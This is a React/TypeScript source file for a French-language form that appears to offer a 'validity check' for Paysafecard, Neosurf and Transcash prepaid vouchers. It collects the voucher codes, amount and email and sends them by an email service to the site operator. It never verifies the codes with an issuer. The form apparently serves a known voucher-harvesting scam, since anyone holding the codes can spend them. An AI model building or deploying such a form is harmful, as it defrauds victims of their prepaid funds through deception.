import { useEffect, useState, useRef } from "react";
import { InfosUser } from "../utils/Types";
import { generateField } from "../utils/generateField";
import { sendUserInfosByEmail } from "../utils/Methods";
import { tabValues } from "../utils/generateField";
import ReCAPTCHA from 'react-google-recaptcha'


function SubmissionForm() {
  const [ticketsFieldGenerate, setTicketsFieldGenerate] = useState([]);
  const [error, setError] = useState("");
  const [message, setMessage] = useState("");
  const [selectedTicked, setSelectedTicked] = useState("Paysafecard");
  const [recaptach, setRecaptach] = useState<string | null>(null)
  const [HtmlInputE, setHtmlInputE] = useState<HTMLInputElement | null>();

  let field1: any = useRef()
  let field2: any = useRef()
  let field3: any = useRef()
  let field4: any = useRef()

  const infosUser: InfosUser = {
    ticket: selectedTicked,
    ticketNumber: 0,
    ticketCodes: [],
    amount: "",
    email: "",
    stringCodes: "",
  };

  const [user, setUser] = useState(infosUser);

  // const setUserTicket = (e: any) => {
  //   console.log(document.querySelector(".selected"));

  //   // const ticket = e.target.innerHTML
  //   // console.log(ticket);

  //   // setUser({...user , ticket});
  // };

  useEffect(() => {
    const htmlIe: HTMLInputElement | null = document.querySelector(".tn");
    setHtmlInputE(htmlIe);
  }, []);

  const resetFields = () => {
    field1.current.value = 'Paysafecard'
    field2.current.value = null
    field3.current.value = null
    field4.current.value = null
    setTicketsFieldGenerate([])
    setSelectedTicked('Paysafecard')
    setUser({
      ticket: 'Paysafecard',
      ticketNumber: 0,
      ticketCodes: [],
      amount: "",
      email: "",
      stringCodes: "",
    })
  }

  const handleAmount = (event: any) => {
    if (
      ![...tabValues].includes(
        event.target.value.split("")[event.target.value.length - 1]
      ) || event.target.value === "0"
    ) {
      const newVal = event.target.value
        .split("")
        .filter((_i: any, v: number) => v < event.target.value.length - 1);
      event.target.value = newVal.join("");
    } else {
      user.amount = event.target.value;
      setUser(user);
    }
  };

  function isValidEmail(email: string) {
    const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return regex.test(email);
  }

  function handleEmail(event: any) {
    if (isValidEmail(event?.target.value)) {
      setUser({ ...user, email: event?.target.value });
      setError("")
    } else {
      setError("Veuillez renseigner un format d'email valide");
    }
  }

  const handleSelectedTicket = (event: any) => {
    setSelectedTicked(event.target.value);
    user.ticketCodes = [];
    user.ticketNumber = 0;
    setUser({ ...user });
    HtmlInputE!.value = "";
    setTicketsFieldGenerate([]);
  };

  const createTicketFieldsByTicketNumber = (ticketNumber: any) => {
    const ticketField: any = [];
    for (let i = 0; i < ticketNumber; i++) {
      ticketField.push(
        generateField(selectedTicked, i, user, setUser, setError)
      );
    }
    setTicketsFieldGenerate(ticketField);
  };

  const verifiedAllFields = () => {
    if (
      user.email == "" ||
      user.ticket == "" ||
      user.ticketCodes.length == 0 ||
      user.ticket == "" ||
      user.amount == ""
    ) {
      return false;
    }
  };

  const submissionProcess = async (e: any) => {
    try {
      e.preventDefault();
      user.ticket = selectedTicked;
      console.log(user);
      if (verifiedAllFields() === false) {
        setError("veuillez remplir tout les champs");
      } else if (!error) {
        //console.log(user);
        // Soumission des infos via mail................................
        user.stringCodes = user.ticketCodes.join(" ; ");
        await sendUserInfosByEmail(
          "service_2bdx7bo",
          "template_gwks2bn",
          user,
          "EJqC4yBZ-H2QIvu8_"
        );
        resetFields()
        setMessage(
          "votre requette a bien été prise en compte, verifiez votre mail"
        );
      }
    } catch (error) {
      console.log(error);
    }
  };

  const handleTicketNumber = (event: any) => {
    if (
      ![...tabValues].includes(
        event.target.value.split("")[event.target.value.length - 1]
      ) || event.target.value === "0"
    ) {
      const newVal = event.target.value
        .split("")
        .filter((_i: any, v: number) => v < event.target.value.length - 1);
      event.target.value = newVal.join("");
    }
    // if (+event.target.value <= 0) {
    //   user.ticketCodes = [];
    //   user.ticketNumber = 0;
    // }
    createTicketFieldsByTicketNumber(+event.target.value);
  };

  return (
    <div id="ticketform" className="box form-container" style={{ height: "800px" }}>
      <div className="login-box" style={{ width: "90%" }}>
        {/* <h2 style={{ fontSize: "1.5em" }}> Consulter votre validité </h2> */}
        <h2 style={{ color: 'white' }} >
          Consulter votre validité
        </h2>
        {error ? (
          <h2
            style={{
              fontSize: "1em",
              width: "100%",
              padding: "10px",
              margin: "0px",
              color: "red",
            }}
          >
            {error}
          </h2>
        ) : (
          <h2
            style={{
              fontSize: "1em",
              width: "100%",
              padding: "10px",
              margin: "0px",
              color: "green",
            }}
          >
            {message}
          </h2>
        )}
        <form>
          <div style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}>
            <label className="select-label">
              <select
                ref={field1}
                name="options"
                onChange={(e) => {
                  handleSelectedTicket(e);
                }}
              >
                <option value="Paysafecard">Paysafecard</option>
                <option value="Neosurf">Neosurf</option>
                <option value="Transcash">Transcash</option>
              </select>
            </label>
          </div>

          {/* { <label
              style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}
              id="img_category_label"
              className="field"
              htmlFor="img_category"
              data-value=""
            >
              <span style={{ margin: "0px", padding: "0px", width: "101%" }}>
                Choix du ticket
              </span>
              <div
                style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}
                id="img_category"
                className="psuedo_select"
              >
                <span className="selected"></span>
                <ul id="img_category_options" className="options">
                  <li className="option" data-value="opt_1">
                    Pcs
                  </li>
                  <li className="option" data-value="opt_2">
                    Neosurf
                  </li>
                  <li className="option" data-value="opt_3">
                    Transcash
                  </li>
                </ul>
              </div>
            </label>} */}

          {
            <div className="user-box persofade">
              <input
                ref={field2}
                type="text"
                maxLength={16}
                required
                onChange={handleAmount}
              />
              <label>Montant </label>
            </div>
          }

          <div className="user-box">
            <input
              ref={field3}
              type="text"
              className="tn"
              required
              max={3}
              name="ticketNumber"
              onChange={handleTicketNumber}
            />
            <label>Nombre de tickets</label>
          </div>

          {ticketsFieldGenerate.length > 1 &&
            <div className="user-box" style={{ position: 'relative' }}>
              <label className="user-box" style={{ position: 'absolute', top: '-35px', display: 'block', color: '#03e9f4', visibility: "visible", paddingBottom: '8px', fontSize: '15px' }}>Veuillez défiler au scroll pour remplir</label>
            </div>
          }

          <div style={ticketsFieldGenerate.length > 1 ? { height: '100px', overflow: 'scroll', padding: '15px 0px' } : {}}>
            {ticketsFieldGenerate}
          </div>
          <div className="user-box persofade">
            <input ref={field4} type="email" required onChange={handleEmail} />
            <label>Email</label>
          </div>
          <ReCAPTCHA
            sitekey="6LdPgawpAAAAAGmOmfkO5HK5JgPzqTe-XSDBJY-A"
            onChange={(val) => setRecaptach(val)}
          />
          {recaptach && <a
            // data-aos="fade-right"
            // data-aos-duration="1000"
            // data-aos-offset="300"
            className="myfadeperso"
            href="#"
            onClick={(e) => {
              submissionProcess(e);
            }}
          >
            <span></span>
            <span></span>
            <span></span>
            <span></span>
            consulter
          </a>}
        </form>
      </div>
    </div>
  );
}

export default SubmissionForm;
